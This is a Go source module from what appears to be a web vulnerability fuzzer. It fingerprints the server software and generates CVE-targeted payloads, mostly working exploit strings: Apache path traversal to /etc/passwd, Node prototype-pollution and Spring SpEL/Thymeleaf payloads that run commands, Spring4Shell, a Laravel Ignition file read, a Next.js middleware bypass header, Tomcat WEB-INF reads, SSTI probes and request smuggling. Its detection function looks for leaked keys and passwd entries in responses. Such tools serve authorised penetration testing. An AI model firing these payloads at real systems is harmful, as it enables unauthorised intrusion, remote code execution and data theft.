package vulns

import (
	"fmt"
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

// CVEProbeModule generates targeted payloads based on detected server/framework fingerprints.
// Unlike nuclei (which checks if a CVE is present), ryofuzz FUZZES the vulnerable code paths
// with massive variations to find both known and unknown issues.
type CVEProbeModule struct {
	ServerHeader string
	PoweredBy    string
	Fingerprints map[string]string
}

func (m *CVEProbeModule) Name() string        { return "cve" }
func (m *CVEProbeModule) Description() string { return "CVE-aware targeted fuzzing based on fingerprints" }

func (m *CVEProbeModule) SetFingerprints(headers map[string][]string) {
	m.Fingerprints = make(map[string]string)
	if v, ok := headers["Server"]; ok && len(v) > 0 {
		m.ServerHeader = v[0]
		m.Fingerprints["server"] = v[0]
	}
	if v, ok := headers["X-Powered-By"]; ok && len(v) > 0 {
		m.PoweredBy = v[0]
		m.Fingerprints["powered_by"] = v[0]
	}
}

func (m *CVEProbeModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload

	// Generate payloads based on detected technology
	generators := []struct {
		match func() bool
		gen   func([]input.InjectionPoint) []mutator.Payload
	}{
		{m.isApache, m.apacheFuzz},
		{m.isNginx, m.nginxFuzz},
		{m.isExpress, m.expressFuzz},
		{m.isSpring, m.springFuzz},
		{m.isNextJS, m.nextjsFuzz},
		{m.isDjango, m.djangoFuzz},
		{m.isLaravel, m.laravelFuzz},
		{m.isASPNET, m.aspnetFuzz},
		{m.isTomcat, m.tomcatFuzz},
		{m.isFlask, m.flaskFuzz},
	}

	for _, g := range generators {
		if g.match() {
			payloads = append(payloads, g.gen(points)...)
		}
	}

	// Always run generic HTTP edge-case fuzzing
	payloads = append(payloads, m.httpEdgeCases(points)...)

	return payloads
}

func (m *CVEProbeModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	// Detect based on response anomalies triggered by CVE-targeted fuzzing
	if respStatus == 500 && baseStatus != 500 {
		return &Finding{Module: "cve", Severity: "high", Confidence: "medium",
			Title: "Server error triggered by CVE-targeted payload (" + payload.Variant + ")",
			Payload: payload.Value, Point: payload.Point,
			Evidence: fmt.Sprintf("500 error with %s payload", payload.Variant),
			OWASP: "A06:2021 Vulnerable and Outdated Components", CWE: "CWE-1035"}
	}
	if respTime-baseTime > 5000 && strings.Contains(payload.Variant, "time") {
		return &Finding{Module: "cve", Severity: "critical", Confidence: "high",
			Title: "Time-based vulnerability confirmed (" + payload.Variant + ")",
			Payload: payload.Value, Point: payload.Point,
			Evidence: fmt.Sprintf("delta=%dms", respTime-baseTime),
			OWASP: "A06:2021 Vulnerable and Outdated Components", CWE: "CWE-1035"}
	}
	// Sensitive data in response
	sensitive := []string{"root:", "AccessKeyId", "password", "secret", "private_key", "BEGIN RSA", "BEGIN PRIVATE"}
	for _, s := range sensitive {
		if strings.Contains(respBody, s) && !strings.Contains(baseBody, s) {
			return &Finding{Module: "cve", Severity: "critical", Confidence: "confirmed",
				Title: "Sensitive data exposed via CVE-targeted payload",
				Payload: payload.Value, Point: payload.Point,
				Evidence: fmt.Sprintf("'%s' found in response", s),
				OWASP: "A06:2021 Vulnerable and Outdated Components", CWE: "CWE-200"}
		}
	}
	return nil
}

// --- Fingerprint matchers ---
func (m *CVEProbeModule) isApache() bool  { return containsAny(m.ServerHeader, "apache", "httpd") }
func (m *CVEProbeModule) isNginx() bool   { return containsAny(m.ServerHeader, "nginx") }
func (m *CVEProbeModule) isExpress() bool  { return containsAny(m.PoweredBy, "express") }
func (m *CVEProbeModule) isSpring() bool   { return containsAny(m.PoweredBy, "spring", "java") || containsAny(m.ServerHeader, "tomcat") }
func (m *CVEProbeModule) isNextJS() bool   { return containsAny(m.PoweredBy, "next") }
func (m *CVEProbeModule) isDjango() bool   { return containsAny(m.PoweredBy, "django", "python") }
func (m *CVEProbeModule) isLaravel() bool  { return containsAny(m.PoweredBy, "php", "laravel") }
func (m *CVEProbeModule) isASPNET() bool   { return containsAny(m.PoweredBy, "asp.net", ".net") }
func (m *CVEProbeModule) isTomcat() bool   { return containsAny(m.ServerHeader, "tomcat", "coyote") }
func (m *CVEProbeModule) isFlask() bool    { return containsAny(m.PoweredBy, "flask", "werkzeug", "python") }

// --- Targeted fuzzers per technology ---

func (m *CVEProbeModule) apacheFuzz(points []input.InjectionPoint) []mutator.Payload {
	// CVE-2023-25690 (request smuggling), CVE-2021-41773/42013 (path traversal)
	var payloads []mutator.Payload
	paths := []string{
		"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
		"/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
		"/.%2e/.%2e/.%2e/.%2e/etc/passwd",
		"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
	}
	for _, point := range points {
		for _, p := range paths {
			payloads = append(payloads, mutator.Payload{Value: p, Point: point, Module: "cve", Variant: "apache-traversal"})
		}
	}
	return payloads
}

func (m *CVEProbeModule) nginxFuzz(points []input.InjectionPoint) []mutator.Payload {
	var payloads []mutator.Payload
	// Off-by-slash, alias traversal
	paths := []string{
		"../", "/..;/", "..%00/", "..%0d/", "/..%2f",
	}
	for _, point := range points {
		for _, p := range paths {
			payloads = append(payloads, mutator.Payload{Value: p, Point: point, Module: "cve", Variant: "nginx-alias-traversal"})
		}
	}
	return payloads
}

func (m *CVEProbeModule) expressFuzz(points []input.InjectionPoint) []mutator.Payload {
	var payloads []mutator.Payload
	// Prototype pollution, ReDoS, type confusion
	ppPayloads := []string{
		`{"__proto__":{"polluted":true}}`,
		`{"constructor":{"prototype":{"polluted":true}}}`,
		`{"__proto__":{"shell":"/proc/self/exe","env":{"NODE_OPTIONS":"--require /proc/self/cmdline"}}}`,
		`{"__proto__":{"type":"Program","body":[{"type":"ExpressionStatement","expression":{"type":"CallExpression"}}]}}`,
		`{"__proto__":{"outputFunctionName":"x]});process.mainModule.require('child_process').execSync('id')//"}}}`,
	}
	for _, point := range points {
		for _, p := range ppPayloads {
			payloads = append(payloads, mutator.Payload{Value: p, Point: point, Module: "cve", Variant: "express-prototype-pollution"})
		}
	}
	return payloads
}

func (m *CVEProbeModule) springFuzz(points []input.InjectionPoint) []mutator.Payload {
	var payloads []mutator.Payload
	// Spring4Shell (CVE-2022-22965), SpEL injection, Actuator
	spring := []struct{ v, t string }{
		{"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di", "spring4shell"},
		{"${T(java.lang.Runtime).getRuntime().exec('id')}", "spel-rce"},
		{"#{T(java.lang.Runtime).getRuntime().exec('id')}", "spel-rce2"},
		{"${7*7}", "spel-detect"},
		{"__${T(java.lang.Runtime).getRuntime().exec('id')}__::", "thymeleaf-rce"},
	}
	for _, point := range points {
		for _, s := range spring {
			payloads = append(payloads, mutator.Payload{Value: s.v, Point: point, Module: "cve", Variant: s.t})
		}
	}
	return payloads
}

func (m *CVEProbeModule) nextjsFuzz(points []input.InjectionPoint) []mutator.Payload {
	var payloads []mutator.Payload
	// CVE-2025-29927 (middleware bypass)
	headers := []string{
		"x-middleware-subrequest: 1",
		"x-middleware-subrequest: middleware",
		"x-middleware-subrequest: src/middleware",
		"x-middleware-subrequest: pages/_middleware",
	}
	for _, point := range points {
		for _, h := range headers {
			payloads = append(payloads, mutator.Payload{Value: h, Point: point, Module: "cve", Variant: "nextjs-middleware-bypass"})
		}
	}
	return payloads
}

func (m *CVEProbeModule) djangoFuzz(points []input.InjectionPoint) []mutator.Payload {
	var payloads []mutator.Payload
	// Django debug page, ORM injection
	django := []string{
		"{{settings.SECRET_KEY}}", "{% debug %}", "{{request.META}}",
		"' OR 1=1--", `{"pk__gt": 0}`,
	}
	for _, point := range points {
		for _, d := range django {
			payloads = append(payloads, mutator.Payload{Value: d, Point: point, Module: "cve", Variant: "django-probe"})
		}
	}
	return payloads
}

func (m *CVEProbeModule) laravelFuzz(points []input.InjectionPoint) []mutator.Payload {
	var payloads []mutator.Payload
	// Laravel debug mode, Ignition RCE (CVE-2021-3129)
	laravel := []string{
		"_method=GET&_token=x",
		`{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"x","viewFile":"php://filter/convert.base64-encode/resource=/etc/passwd"}}`,
	}
	for _, point := range points {
		for _, l := range laravel {
			payloads = append(payloads, mutator.Payload{Value: l, Point: point, Module: "cve", Variant: "laravel-probe"})
		}
	}
	return payloads
}

func (m *CVEProbeModule) aspnetFuzz(points []input.InjectionPoint) []mutator.Payload {
	var payloads []mutator.Payload
	// ViewState deserialization, padding oracle
	aspnet := []string{
		`/trace.axd`, `/elmah.axd`,
		"__VIEWSTATE=" + strings.Repeat("A", 100),
		"__EVENTVALIDATION=invalid",
	}
	for _, point := range points {
		for _, a := range aspnet {
			payloads = append(payloads, mutator.Payload{Value: a, Point: point, Module: "cve", Variant: "aspnet-probe"})
		}
	}
	return payloads
}

func (m *CVEProbeModule) tomcatFuzz(points []input.InjectionPoint) []mutator.Payload {
	var payloads []mutator.Payload
	// Ghostcat (CVE-2020-1938), manager, default creds
	tomcat := []string{
		"/manager/html", "/host-manager/html",
		"/../WEB-INF/web.xml", "/..;/manager/html",
		"/WEB-INF/web.xml",
	}
	for _, point := range points {
		for _, t := range tomcat {
			payloads = append(payloads, mutator.Payload{Value: t, Point: point, Module: "cve", Variant: "tomcat-probe"})
		}
	}
	return payloads
}

func (m *CVEProbeModule) flaskFuzz(points []input.InjectionPoint) []mutator.Payload {
	var payloads []mutator.Payload
	// Werkzeug debugger, SSTI
	flask := []string{
		"/console", "{{config}}", "{{7*7}}", "{{config.items()}}",
		"{{request.environ}}", "{{url_for.__globals__}}",
	}
	for _, point := range points {
		for _, f := range flask {
			payloads = append(payloads, mutator.Payload{Value: f, Point: point, Module: "cve", Variant: "flask-probe"})
		}
	}
	return payloads
}

func (m *CVEProbeModule) httpEdgeCases(points []input.InjectionPoint) []mutator.Payload {
	var payloads []mutator.Payload
	// HTTP protocol edge cases that trigger bugs regardless of framework
	edges := []struct{ v, t string }{
		{"Transfer-Encoding: chunked\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n", "http-smuggling-te"},
		{strings.Repeat("A", 8192), "header-overflow"},
		{"%00", "null-byte"},
		{"\r\n\r\n", "double-crlf"},
		{strings.Repeat("../", 100), "deep-traversal"},
		{"{{", "template-probe"},
		{"${", "expression-probe"},
		{"<%", "tag-probe"},
	}
	for _, point := range points {
		for _, e := range edges {
			payloads = append(payloads, mutator.Payload{Value: e.v, Point: point, Module: "cve", Variant: e.t})
		}
	}
	return payloads
}

func containsAny(s string, subs ...string) bool {
	lower := strings.ToLower(s)
	for _, sub := range subs {
		if strings.Contains(lower, sub) {
			return true
		}
	}
	return false
}
